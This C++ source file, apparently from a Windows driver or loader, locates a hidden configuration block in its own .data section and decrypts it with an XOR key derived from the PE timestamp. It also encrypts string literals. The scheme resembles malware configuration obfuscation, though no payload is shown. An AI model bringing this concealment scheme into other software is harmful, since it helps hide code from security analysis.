//==============================================================================

#include "DrvParams.h"

//==============================================================================
DWORD GetParamXorValue(void)
{
 PVOID ModBase = GetCurrentModule();
 DOS_HEADER *DosHdr = (DOS_HEADER*)ModBase;
 WIN_HEADER<PECURRENT> *WinHdr = (WIN_HEADER<PECURRENT>*)&(((BYTE*)ModBase)[DosHdr->OffsetHeaderPE]);
 DWORD TimeStamp = WinHdr->FileHeader.TimeDateStamp;
 return (((TimeStamp & 0x0000000F) << 28)|((TimeStamp & 0xF0000000) >> 28))|(((TimeStamp & 0x00000F00) << 12)|((TimeStamp & 0x00F00000) >> 12))|(TimeStamp & 0x0F0FF0F0);
}
//---------------------------------------------------------------------------
PDWORD GetParamBlkAddress(void)
{
 SECTION_HEADER Sec;
 
 PVOID ModBase = GetCurrentModule();
 DBGMSG("Module base = %p", ModBase);                                          
 if(!GetModuleSection(ModBase, ENCS(".data"), &Sec))
  {  
   DBGMSG("Data section found: RVA=%08X, PSize=%08X, VSize=%08X", Sec.SectionRva, Sec.PhysicalSize, Sec.VirtualSize);      
   PBYTE DPtr = &((PBYTE)ModBase)[Sec.SectionRva+Sec.VirtualSize];  // Sometimes a Zeroes are not present in range of PhysicalSize
   for(UINT ctr=0;ctr < Sec.VirtualSize;ctr++,DPtr--)if(*DPtr == CFGBLKFLAG)return (PDWORD)DPtr; 
  }
 DBGMSG("Parameters block not found!");               
 return NULL; 
}
//---------------------------------------------------------------------------
WCHAR  BkDecryptWChar(WORD XorVal, WCHAR Data)
{
 Data ^= ~XorVal;
 return ((Data << 12)&0xF000)|((Data >> 12)&0x000F)|((Data << 4)&0x0F00)|((Data >> 4)&0x00F0); // ABCD >> DCBA
}
//---------------------------------------------------------------------------
WORD   BkExtractWord(DWORD XorVal, PDWORD Data)
{
 XorVal = ((XorVal & 0x000000FF) << 16)|((XorVal & 0x00FF0000) >> 16)|(XorVal & 0x0000FF00); // Reverse byte order
 DWORD Value = (*Data ^ (XorVal << 8)) >> 16;
 return (Value << 8)|(Value >> 8);
}
//---------------------------------------------------------------------------
DWORD  BkExtractDWord(DWORD XorVal, PDWORD Data)
{
 return (BkExtractWord(XorVal,&Data[-1]) << 16)|BkExtractWord(XorVal,&Data[-2]);
}
//---------------------------------------------------------------------------
WCHAR  BkExtractWChar(WORD SLen, DWORD XorVal, PDWORD Data)
{
 WORD Value = BkExtractWord(XorVal,&Data[-1]);
 return BkDecryptWChar(SLen, Value);
}
//---------------------------------------------------------------------------
DWORD GetGlobalParameter(UINT ParamIndex, DWORD XorVal, PDWORD DataBlk)
{
 if(((PBYTE)DataBlk)[0] != CFGBLKFLAG)return -1;
 UINT ParamCnt = BkExtractDWord(XorVal, DataBlk);
 if(ParamCnt <= ParamIndex)return -2;   // No parameter (Must not happen!)
 ParamIndex = (ParamCnt-ParamIndex)-1;
 DataBlk   -= ((ParamIndex+1)*2);
 return BkExtractDWord(XorVal, DataBlk);
}
//---------------------------------------------------------------------------
DWORD GetGlobalParameter(UINT ParamIndex)
{
 DWORD  XorVal;
 PDWORD Ptr = GetParametersBlock(&XorVal, NULL);
 return GetGlobalParameter(ParamIndex, XorVal, Ptr);
}
//---------------------------------------------------------------------------
int  GetEncryptedSubItem(UINT ItemType, UINT Index, UINT SubIndex, UINT BufSize, PWSTR Buffer, DWORD XorVal, PDWORD DataBlk, PDWORD IType, PDWORD ISize)
{
 if(((PBYTE)DataBlk)[0] != CFGBLKFLAG)return 0;
 DWORD ParamCnt = BkExtractDWord(XorVal, DataBlk);
 DataBlk -= 2+(ParamCnt*2);     // Skip block of global parameters
 DWORD ItemCnt  = BkExtractDWord(XorVal, DataBlk);
 DataBlk -= 2;
 for(UINT ictr=0;ictr<ItemCnt;ictr++)
  {
   DWORD Type = BkExtractDWord(XorVal, &DataBlk[-0]);
   DWORD Size = BkExtractDWord(XorVal, &DataBlk[-2]);
   DataBlk   -= 4;
   long BCtr  = Size/sizeof(WCHAR);
   if((!ItemType || (Type == ItemType))&&(ictr == Index))
	{
     long ctr = 0;
	 UINT idx = 0;	 
	 UINT itm = 0;
	 for(;(ctr < BCtr)&&(itm <= SubIndex);ctr++)
	  {
	   WCHAR Value = BkExtractWChar(BCtr, XorVal, &DataBlk[ctr-BCtr+1]);
	   if(Value == SIDELIM){itm++;continue;}
	   if(itm   == SubIndex){Buffer[idx] = Value;idx++;}
	  }
	 Buffer[idx] = 0;  // Terminating Zero
	 if(IType)*IType = Type;
	 if(ISize)*ISize = Size;
	 if(!idx && (ctr == BCtr) && (!itm || (itm < SubIndex)))return -2;  // No more subitems
	 return (idx * sizeof(WCHAR));  // 0 if the sub item not found or empty
	}
   DataBlk -= BCtr;
  }
 return -1;
}
//---------------------------------------------------------------------------
PDWORD GetParametersBlock(PDWORD XorVal, PDWORD ICount, PDWORD GCount)  
{
 PDWORD Ptr  = GetParamBlkAddress();  
 DWORD  DXor = GetParamXorValue();
 DWORD  GCtr = BkExtractDWord(DXor, Ptr);     // Skip parameters block
 DWORD  ICtr = BkExtractDWord(DXor, (Ptr-((GCtr+1)*2))); 
 if(XorVal)*XorVal = DXor;
 if(ICount)*ICount = ICtr;
 if(GCount)*GCount = GCtr;
 DBGMSG("Globals count = %u",GCtr);
 DBGMSG("Item count = %u",ICtr);
 return Ptr;
}
//------------------------------------------------------------------------------

